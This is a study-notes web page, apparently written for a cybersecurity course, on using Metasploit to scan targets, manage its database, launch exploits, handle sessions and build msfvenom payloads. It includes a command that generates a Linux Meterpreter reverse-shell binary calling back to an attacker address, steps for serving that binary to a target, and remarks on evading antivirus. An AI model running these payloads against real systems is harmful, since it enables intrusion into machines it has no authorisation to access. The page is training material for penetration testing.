<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="icon" href="/favicon.ico"/><title>Exploitation</title><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="description" content="Personal Knowledge Space"/><meta property="og:title" content="Exploitation"/><meta property="og:description" content="Personal Knowledge Space"/><meta property="og:url" content="https://tysonnguyen.github.io/IBM-cybersecurity/notes/0kj8xnsfecw7wnis65jbzok/"/><meta property="og:type" content="article"/><meta property="article:published_time" content="6/4/2022"/><meta property="article:modified_time" content="6/9/2022"/><link rel="canonical" href="https://tysonnguyen.github.io/IBM-cybersecurity/notes/0kj8xnsfecw7wnis65jbzok/"/><meta name="next-head-count" content="14"/><link rel="preload" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" as="style"/><link rel="stylesheet" href="/IBM-cybersecurity/_next/static/css/0aeb6c71ee87f6df.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/IBM-cybersecurity/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/IBM-cybersecurity/_next/static/chunks/webpack-b7a0bb0748951285.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/framework-bb5c596eafb42b22.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/main-3d5e78ffcdd2778f.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/_app-b0ef1900ae658bfa.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/78-13ae6acd5ce7ca5b.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/373-2f3879190a46a3d9.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/chunks/pages/notes/%5Bid%5D-69449972c2a725d8.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_buildManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_ssgManifest.js" defer=""></script><script src="/IBM-cybersecurity/_next/static/NXb5WjKoAzTxCthMfgKQk/_middlewareManifest.js" defer=""></script></head><body><div id="__next" data-reactroot=""><section class="ant-layout" style="width:100%;min-height:100%"><header class="ant-layout-header" style="position:fixed;isolation:isolate;z-index:1;width:100%;border-bottom:1px solid #d4dadf;height:64px;padding:0 24px 0 2px"><div class="ant-row ant-row-center" style="max-width:992px;justify-content:space-between;margin:0 auto"><div style="display:flex" class="ant-col ant-col-xs-20 ant-col-sm-4"></div><div class="ant-col gutter-row ant-col-xs-0 ant-col-sm-20 ant-col-md-20 ant-col-lg-19"><div class="ant-select ant-select-lg ant-select-auto-complete ant-select-single ant-select-allow-clear ant-select-show-search" style="width:100%"><div class="ant-select-selector"><span class="ant-select-selection-search"><input type="search" autoComplete="off" class="ant-select-selection-search-input" role="combobox" aria-haspopup="listbox" aria-owns="undefined_list" aria-autocomplete="list" aria-controls="undefined_list" aria-activedescendant="undefined_list_0" value=""/></span><span class="ant-select-selection-placeholder">For full text search please use the &#x27;?&#x27; prefix. e.g. ? Onboarding</span></div></div></div><div style="display:none;align-items:center;justify-content:center" class="ant-col ant-col-xs-4 ant-col-sm-4 ant-col-md-0 ant-col-lg-0"><span role="img" aria-label="menu" style="font-size:24px" tabindex="-1" class="anticon anticon-menu"><svg viewBox="64 64 896 896" focusable="false" data-icon="menu" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M904 160H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0 624H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8zm0-312H120c-4.4 0-8 3.6-8 8v64c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-64c0-4.4-3.6-8-8-8z"></path></svg></span></div></div></header><section class="ant-layout site-layout" style="margin-top:64px"><section class="ant-layout site-layout"><div class="site-layout-sidebar" style="flex:0 0 auto;width:calc(max((100% - 992px) / 2, 0px) + 200px);min-width:200px;padding-left:calc((100% - 992px) / 2)"><aside class="ant-layout-sider ant-layout-sider-dark" style="position:fixed;overflow:auto;height:calc(100vh - 64px);background-color:transparent;flex:0 0 200px;max-width:200px;min-width:200px;width:200px"><div class="ant-layout-sider-children"></div></aside></div><section class="ant-layout side-layout-main" style="max-width:1200px;display:initial"><main class="ant-layout-content main-content" role="main" style="padding:0 24px"><div class="ant-row"><div class="ant-col ant-col-24"><div class="ant-row" style="margin-left:-10px;margin-right:-10px"><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-24 ant-col-md-18"><div><h1 id="exploitation"><a aria-hidden="true" class="anchor-heading icon-link" href="#exploitation"></a>Exploitation</h1>
<h1 id="tasks"><a aria-hidden="true" class="anchor-heading icon-link" href="#tasks"></a>Tasks</h1>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled> How to scan target systems using Metasploit.</li>
<li class="task-list-item"><input type="checkbox" disabled> How to use the Metasploit database feature.</li>
<li class="task-list-item"><input type="checkbox" disabled> How to use Metasploit to conduct a vulnerability scan.</li>
<li class="task-list-item"><input type="checkbox" disabled> How to use Metasploit exploit vulnerable services on target systems.</li>
<li class="task-list-item"><input type="checkbox" disabled> How <code>msfvenom</code> can be used to create payloads and obtain a Meterpreter session on the target system.</li>
</ul>
<h2 id="scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#scanning"></a>Scanning</h2>
<h3 id="port-scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#port-scanning"></a>Port Scanning</h3>
<p>Metasploit has many modules to scan open ports on the target system and network.</p>
<ul>
<li>List potential port scanning modules available using <code>search portscan</code> command.</li>
</ul>
<p>Options:</p>
<ul>
<li>
<p><strong>CONCURRENCY</strong>
: Number of targets to be scanned simultaneously.</p>
</li>
<li>
<p><strong>PORTS</strong>
: Port range to be scanned. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.</p>
</li>
<li>
<p><strong>RHOSTS</strong>
: Target or target network to be scanned.</p>
</li>
<li>
<p><strong>THREADS</strong>
: Number of threads that will be used simultaneously. More threads = faster scans.</p>
</li>
</ul>
<h4 id="udp-service-identification"><a aria-hidden="true" class="anchor-heading icon-link" href="#udp-service-identification"></a>UDP Service Identification</h4>
<p><code>scanner/discovery/udp_sweep</code> module will allow to quickly identify services running over the UDP (User Data Protocol).</p>
<h4 id="smb-scans"><a aria-hidden="true" class="anchor-heading icon-link" href="#smb-scans"></a>SMB Scans</h4>
<p>On a corporate network, <code>smb_enumshares</code> and <code>smb_version</code> to identify specific services on system.</p>
<p>Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system. </p>
<p>[+] 10.10.192.91:         - 10.10.192.91:22 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:21 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:139 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:445 - TCP OPEN
[+] 10.10.192.91:         - 10.10.192.91:8000 - TCP OPEN
[*] 10.10.192.91:         - Scanned 1 of 1 hosts (100% complete)</p>
<h2 id="the-metasploit-database"><a aria-hidden="true" class="anchor-heading icon-link" href="#the-metasploit-database"></a>The Metasploit Database</h2>
<p>Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.</p>
<h3 id="starting-postgresql-and-msfconsole-database"><a aria-hidden="true" class="anchor-heading icon-link" href="#starting-postgresql-and-msfconsole-database"></a>Starting Postgresql and <code>msfconsole</code> Database</h3>
<p>You will first need to start the PostgreSQL database, which Metasploit will use with the following command: </p>
<p><code>systemctl start postgresql</code></p>
<p>Then initialize Metasploit Database using the <code>msfdb init</code> command and <code>db_status</code> to check the status after launching msfconsole.</p>
<h3 id="listing-workspaces"><a aria-hidden="true" class="anchor-heading icon-link" href="#listing-workspaces"></a>Listing Workspaces</h3>
<p>The database feature allows to create workspaces to isolate different projects. List available workspaces using the <code>workspace</code> command.</p>
<ul>
<li>Can add a workspace using the <code>-a</code> parameter or delete a workspace with <code>-d</code> parameter.</li>
</ul>
<h3 id="changing-workspaces"><a aria-hidden="true" class="anchor-heading icon-link" href="#changing-workspaces"></a>Changing Workspaces</h3>
<ul>
<li>Switch between workspaces by typing <code>workspace</code> followed by the desired workspace name.</li>
</ul>
<h4 id="workspace-help"><a aria-hidden="true" class="anchor-heading icon-link" href="#workspace-help"></a>Workspace Help</h4>
<ul>
<li>Use <code>workspace -h</code> command to list available options for the <code>workspace</code> command.</li>
</ul>
<h4 id="database-backend-commands"><a aria-hidden="true" class="anchor-heading icon-link" href="#database-backend-commands"></a>Database Backend Commands</h4>
<ul>
<li>Once Metasploit is launched with a database, the <code>help</code> command will show the Database Backends Commands menu.</li>
</ul>
<h4 id="db_nmap-command"><a aria-hidden="true" class="anchor-heading icon-link" href="#db_nmap-command"></a>db_nmap Command</h4>
<ul>
<li>Running Nmap scan with <code>db_nmap</code> will save the results to the database.</li>
</ul>
<h4 id="hosts-and-services"><a aria-hidden="true" class="anchor-heading icon-link" href="#hosts-and-services"></a>Hosts and Services</h4>
<ul>
<li>Can reach information relevant to hosts and services running on target systems with the <code>hosts</code> and <code>services</code> commands.</li>
</ul>
<p>Once the host information is stored in the database, you can use the <code>hosts -R</code> command to add this value to the RHOSTS parameter.</p>
<h3 id="vulnerability-scanning"><a aria-hidden="true" class="anchor-heading icon-link" href="#vulnerability-scanning"></a>Vulnerability Scanning</h3>
<p>Metasploit allows to quickly identify some critical vulnerabilities that could be considered as "low hanging fruit". Usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow access.</p>
<p><code>info</code> command for any module to have a better understanding of its use and purpose.</p>
<h3 id="exploitation-1"><a aria-hidden="true" class="anchor-heading icon-link" href="#exploitation-1"></a>Exploitation</h3>
<p>Metasploit is an exploitation framework and exploits are the most populated module category.</p>
<ul>
<li>Search for exploits using the <code>search</code> command.</li>
<li>Obtain more information about the exploit using the <code>info</code> command.</li>
<li>Launch the exploit using <code>exploit</code>.</li>
</ul>
<p>The process seems simple but a successful outcome depends on a thorough understanding of services running on a target system.</p>
<h4 id="available-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#available-payloads"></a>Available Payloads</h4>
<p>Most of the exploits have a preset default payload.</p>
<ul>
<li>Can always use the <code>show payloads</code> command to list other commands for that specific exploit.</li>
<li>Use <code>set payload</code> command to select payload of choice.</li>
</ul>
<h4 id="background"><a aria-hidden="true" class="anchor-heading icon-link" href="#background"></a>Background</h4>
<p>Once a session is opened, <code>CTRL+Z</code> to background or abort it using <code>CTRL+C</code>.</p>
<h4 id="working-with-sessions"><a aria-hidden="true" class="anchor-heading icon-link" href="#working-with-sessions"></a>Working with Sessions</h4>
<p>The <code>sessions</code> command will list all active sessions.</p>
<ul>
<li>Interact with any existing session using the <code>sessions -i</code> command followed by the session ID.</li>
</ul>
<h2 id="msfvenom"><a aria-hidden="true" class="anchor-heading icon-link" href="#msfvenom"></a>Msfvenom</h2>
<p>Replaces Msfpayload and Msfencode to generate payloads.</p>
<ul>
<li>Msfvenom will allow to access all payloads in the Metasploit framework.</li>
<li>Msfvenom allows to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).</li>
</ul>
<h3 id="output-formats"><a aria-hidden="true" class="anchor-heading icon-link" href="#output-formats"></a>Output Formats</h3>
<ul>
<li>Can generate stand-alone payloads or get a usable raw format with <code>msfvenom --list formats</code>.</li>
</ul>
<h3 id="encoders"><a aria-hidden="true" class="anchor-heading icon-link" href="#encoders"></a>Encoders</h3>
<p>Encoders do not aim to bypass antivirus installed on the target system. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shell code is better solution to the problem.</p>
<ul>
<li>Usage of encoding with <code>-e</code> parameter.</li>
</ul>
<h3 id="handlers"><a aria-hidden="true" class="anchor-heading icon-link" href="#handlers"></a>Handlers</h3>
<p>Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload.</p>
<ul>
<li>The term commonly used to receive a connection from a target is "catching a shell". Reverse shells or Meterpreter callbacks generated in the MSFvenom payload can be easily caught using a handler.</li>
<li>Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells.</li>
<li>Multi Handler to receive the incoming connections with <code>use exploit/multi/handler</code> command.</li>
</ul>
<h4 id="other-payloads"><a aria-hidden="true" class="anchor-heading icon-link" href="#other-payloads"></a>Other Payloads</h4>
<p>Linux Executable and Linkable Format (elf)
<code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.13.40.171 LPORT=4444 -f elf > rev_shell.elf</code></p>
<p>Transfer to the target machine by starting a Python web serer on attacking machine with <code>python3 -m http.server 9000</code> command. Then use wget to download it to the target machine (Linux)</p>
<h2 id="summary"><a aria-hidden="true" class="anchor-heading icon-link" href="#summary"></a>Summary</h2>
<ul>
<li>Database feature can help with penetration testing with multiple targets.</li>
<li>Creation of stand-alone Meterpreter payloads.
<ul>
<li>Helpful in situations where we can upload a file to the target system or have the ability to download files to the target system.</li>
</ul>
</li>
<li>Meterpreter is a powerful tool that offers a lot of features during the post-exploitation phase.</li>
</ul></div></div><div style="padding-left:10px;padding-right:10px" class="ant-col ant-col-xs-0 ant-col-md-6"><div><div class=""><div class="ant-anchor-wrapper dendron-toc" style="max-height:calc(100vh - 64px);z-index:1"><div class="ant-anchor"><div class="ant-anchor-ink"><span class="ant-anchor-ink-ball"></span></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#tasks" title="Tasks">Tasks</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#scanning" title="Scanning">Scanning</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#port-scanning" title="Port Scanning">Port Scanning</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#udp-service-identification" title="UDP Service Identification">UDP Service Identification</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#smb-scans" title="SMB Scans">SMB Scans</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#the-metasploit-database" title="The Metasploit Database">The Metasploit Database</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#starting-postgresql-and-msfconsole-database" title="Starting Postgresql and msfconsole Database">Starting Postgresql and msfconsole Database</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#listing-workspaces" title="Listing Workspaces">Listing Workspaces</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#changing-workspaces" title="Changing Workspaces">Changing Workspaces</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#workspace-help" title="Workspace Help">Workspace Help</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#database-backend-commands" title="Database Backend Commands">Database Backend Commands</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#db_nmap-command" title="db_nmap Command">db_nmap Command</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#hosts-and-services" title="Hosts and Services">Hosts and Services</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#vulnerability-scanning" title="Vulnerability Scanning">Vulnerability Scanning</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#exploitation" title="Exploitation">Exploitation</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#available-payloads" title="Available Payloads">Available Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#background" title="Background">Background</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#working-with-sessions" title="Working with Sessions">Working with Sessions</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#msfvenom" title="Msfvenom">Msfvenom</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#output-formats" title="Output Formats">Output Formats</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#encoders" title="Encoders">Encoders</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#handlers" title="Handlers">Handlers</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#other-payloads" title="Other Payloads">Other Payloads</a></div><div class="ant-anchor-link"><a class="ant-anchor-link-title" href="#summary" title="Summary">Summary</a></div></div></div></div></div></div></div></div></div></main><div class="ant-divider ant-divider-horizontal" role="separator"></div><footer class="ant-layout-footer" style="padding:0 24px 24px"></footer></section></section></section></section></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"note":{"id":"0kj8xnsfecw7wnis65jbzok","title":"Exploitation","desc":"","updated":1654809781117,"created":1654385678517,"custom":{},"fname":"metasploit.exploitation","type":"note","vault":{"fsPath":"vault"},"contentHash":"61913b04203f0a4f2fade42b99f2e515","links":[],"anchors":{"tasks":{"type":"header","text":"Tasks","value":"tasks","line":8,"column":0,"depth":1},"scanning":{"type":"header","text":"Scanning","value":"scanning","line":16,"column":0,"depth":2},"port-scanning":{"type":"header","text":"Port Scanning","value":"port-scanning","line":18,"column":0,"depth":3},"udp-service-identification":{"type":"header","text":"UDP Service Identification","value":"udp-service-identification","line":38,"column":0,"depth":4},"smb-scans":{"type":"header","text":"SMB Scans","value":"smb-scans","line":42,"column":0,"depth":4},"the-metasploit-database":{"type":"header","text":"The Metasploit Database","value":"the-metasploit-database","line":55,"column":0,"depth":2},"starting-postgresql-and-msfconsole-database":{"type":"header","text":"Starting Postgresql and msfconsole Database","value":"starting-postgresql-and-msfconsole-database","line":59,"column":0,"depth":3},"listing-workspaces":{"type":"header","text":"Listing Workspaces","value":"listing-workspaces","line":67,"column":0,"depth":3},"changing-workspaces":{"type":"header","text":"Changing Workspaces","value":"changing-workspaces","line":73,"column":0,"depth":3},"workspace-help":{"type":"header","text":"Workspace Help","value":"workspace-help","line":77,"column":0,"depth":4},"database-backend-commands":{"type":"header","text":"Database Backend Commands","value":"database-backend-commands","line":81,"column":0,"depth":4},"db_nmap-command":{"type":"header","text":"db_nmap Command","value":"db_nmap-command","line":85,"column":0,"depth":4},"hosts-and-services":{"type":"header","text":"Hosts and Services","value":"hosts-and-services","line":89,"column":0,"depth":4},"vulnerability-scanning":{"type":"header","text":"Vulnerability Scanning","value":"vulnerability-scanning","line":95,"column":0,"depth":3},"exploitation":{"type":"header","text":"Exploitation","value":"exploitation","line":101,"column":0,"depth":3},"available-payloads":{"type":"header","text":"Available Payloads","value":"available-payloads","line":111,"column":0,"depth":4},"background":{"type":"header","text":"Background","value":"background","line":118,"column":0,"depth":4},"working-with-sessions":{"type":"header","text":"Working with Sessions","value":"working-with-sessions","line":122,"column":0,"depth":4},"msfvenom":{"type":"header","text":"Msfvenom","value":"msfvenom","line":128,"column":0,"depth":2},"output-formats":{"type":"header","text":"Output Formats","value":"output-formats","line":135,"column":0,"depth":3},"encoders":{"type":"header","text":"Encoders","value":"encoders","line":139,"column":0,"depth":3},"handlers":{"type":"header","text":"Handlers","value":"handlers","line":145,"column":0,"depth":3},"other-payloads":{"type":"header","text":"Other Payloads","value":"other-payloads","line":153,"column":0,"depth":4},"summary":{"type":"header","text":"Summary","value":"summary","line":160,"column":0,"depth":2}},"children":[],"parent":"9k9gs0zqcs40mq2fsi5nesj","data":{}},"body":"\u003ch1 id=\"exploitation\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#exploitation\"\u003e\u003c/a\u003eExploitation\u003c/h1\u003e\n\u003ch1 id=\"tasks\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#tasks\"\u003e\u003c/a\u003eTasks\u003c/h1\u003e\n\u003cul class=\"contains-task-list\"\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e How to scan target systems using Metasploit.\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e How to use the Metasploit database feature.\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e How to use Metasploit to conduct a vulnerability scan.\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e How to use Metasploit exploit vulnerable services on target systems.\u003c/li\u003e\n\u003cli class=\"task-list-item\"\u003e\u003cinput type=\"checkbox\" disabled\u003e How \u003ccode\u003emsfvenom\u003c/code\u003e can be used to create payloads and obtain a Meterpreter session on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"scanning\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#scanning\"\u003e\u003c/a\u003eScanning\u003c/h2\u003e\n\u003ch3 id=\"port-scanning\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#port-scanning\"\u003e\u003c/a\u003ePort Scanning\u003c/h3\u003e\n\u003cp\u003eMetasploit has many modules to scan open ports on the target system and network.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eList potential port scanning modules available using \u003ccode\u003esearch portscan\u003c/code\u003e command.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOptions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eCONCURRENCY\u003c/strong\u003e\n: Number of targets to be scanned simultaneously.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003ePORTS\u003c/strong\u003e\n: Port range to be scanned. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eRHOSTS\u003c/strong\u003e\n: Target or target network to be scanned.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eTHREADS\u003c/strong\u003e\n: Number of threads that will be used simultaneously. More threads = faster scans.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"udp-service-identification\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#udp-service-identification\"\u003e\u003c/a\u003eUDP Service Identification\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003escanner/discovery/udp_sweep\u003c/code\u003e module will allow to quickly identify services running over the UDP (User Data Protocol).\u003c/p\u003e\n\u003ch4 id=\"smb-scans\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#smb-scans\"\u003e\u003c/a\u003eSMB Scans\u003c/h4\u003e\n\u003cp\u003eOn a corporate network, \u003ccode\u003esmb_enumshares\u003c/code\u003e and \u003ccode\u003esmb_version\u003c/code\u003e to identify specific services on system.\u003c/p\u003e\n\u003cp\u003eMetasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system. \u003c/p\u003e\n\u003cp\u003e[+] 10.10.192.91:         - 10.10.192.91:22 - TCP OPEN\n[+] 10.10.192.91:         - 10.10.192.91:21 - TCP OPEN\n[+] 10.10.192.91:         - 10.10.192.91:139 - TCP OPEN\n[+] 10.10.192.91:         - 10.10.192.91:445 - TCP OPEN\n[+] 10.10.192.91:         - 10.10.192.91:8000 - TCP OPEN\n[*] 10.10.192.91:         - Scanned 1 of 1 hosts (100% complete)\u003c/p\u003e\n\u003ch2 id=\"the-metasploit-database\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#the-metasploit-database\"\u003e\u003c/a\u003eThe Metasploit Database\u003c/h2\u003e\n\u003cp\u003eMetasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values.\u003c/p\u003e\n\u003ch3 id=\"starting-postgresql-and-msfconsole-database\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#starting-postgresql-and-msfconsole-database\"\u003e\u003c/a\u003eStarting Postgresql and \u003ccode\u003emsfconsole\u003c/code\u003e Database\u003c/h3\u003e\n\u003cp\u003eYou will first need to start the PostgreSQL database, which Metasploit will use with the following command: \u003c/p\u003e\n\u003cp\u003e\u003ccode\u003esystemctl start postgresql\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eThen initialize Metasploit Database using the \u003ccode\u003emsfdb init\u003c/code\u003e command and \u003ccode\u003edb_status\u003c/code\u003e to check the status after launching msfconsole.\u003c/p\u003e\n\u003ch3 id=\"listing-workspaces\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#listing-workspaces\"\u003e\u003c/a\u003eListing Workspaces\u003c/h3\u003e\n\u003cp\u003eThe database feature allows to create workspaces to isolate different projects. List available workspaces using the \u003ccode\u003eworkspace\u003c/code\u003e command.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCan add a workspace using the \u003ccode\u003e-a\u003c/code\u003e parameter or delete a workspace with \u003ccode\u003e-d\u003c/code\u003e parameter.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"changing-workspaces\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#changing-workspaces\"\u003e\u003c/a\u003eChanging Workspaces\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eSwitch between workspaces by typing \u003ccode\u003eworkspace\u003c/code\u003e followed by the desired workspace name.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"workspace-help\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#workspace-help\"\u003e\u003c/a\u003eWorkspace Help\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eUse \u003ccode\u003eworkspace -h\u003c/code\u003e command to list available options for the \u003ccode\u003eworkspace\u003c/code\u003e command.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"database-backend-commands\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#database-backend-commands\"\u003e\u003c/a\u003eDatabase Backend Commands\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eOnce Metasploit is launched with a database, the \u003ccode\u003ehelp\u003c/code\u003e command will show the Database Backends Commands menu.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"db_nmap-command\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#db_nmap-command\"\u003e\u003c/a\u003edb_nmap Command\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eRunning Nmap scan with \u003ccode\u003edb_nmap\u003c/code\u003e will save the results to the database.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"hosts-and-services\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#hosts-and-services\"\u003e\u003c/a\u003eHosts and Services\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eCan reach information relevant to hosts and services running on target systems with the \u003ccode\u003ehosts\u003c/code\u003e and \u003ccode\u003eservices\u003c/code\u003e commands.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce the host information is stored in the database, you can use the \u003ccode\u003ehosts -R\u003c/code\u003e command to add this value to the RHOSTS parameter.\u003c/p\u003e\n\u003ch3 id=\"vulnerability-scanning\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#vulnerability-scanning\"\u003e\u003c/a\u003eVulnerability Scanning\u003c/h3\u003e\n\u003cp\u003eMetasploit allows to quickly identify some critical vulnerabilities that could be considered as \"low hanging fruit\". Usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow access.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003einfo\u003c/code\u003e command for any module to have a better understanding of its use and purpose.\u003c/p\u003e\n\u003ch3 id=\"exploitation-1\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#exploitation-1\"\u003e\u003c/a\u003eExploitation\u003c/h3\u003e\n\u003cp\u003eMetasploit is an exploitation framework and exploits are the most populated module category.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSearch for exploits using the \u003ccode\u003esearch\u003c/code\u003e command.\u003c/li\u003e\n\u003cli\u003eObtain more information about the exploit using the \u003ccode\u003einfo\u003c/code\u003e command.\u003c/li\u003e\n\u003cli\u003eLaunch the exploit using \u003ccode\u003eexploit\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe process seems simple but a successful outcome depends on a thorough understanding of services running on a target system.\u003c/p\u003e\n\u003ch4 id=\"available-payloads\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#available-payloads\"\u003e\u003c/a\u003eAvailable Payloads\u003c/h4\u003e\n\u003cp\u003eMost of the exploits have a preset default payload.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eCan always use the \u003ccode\u003eshow payloads\u003c/code\u003e command to list other commands for that specific exploit.\u003c/li\u003e\n\u003cli\u003eUse \u003ccode\u003eset payload\u003c/code\u003e command to select payload of choice.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"background\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#background\"\u003e\u003c/a\u003eBackground\u003c/h4\u003e\n\u003cp\u003eOnce a session is opened, \u003ccode\u003eCTRL+Z\u003c/code\u003e to background or abort it using \u003ccode\u003eCTRL+C\u003c/code\u003e.\u003c/p\u003e\n\u003ch4 id=\"working-with-sessions\"\u003e\u003ca aria-hidden=\"true\" class=\"anchor-heading icon-link\" href=\"#working-with-sessions\"\u003e\u003c/a\u003eWorking with Sessions\u003c/h4\u003e\n\u003cp\u003eThe \u003ccode\u003esessions\u003c/code\u003e command will list all active 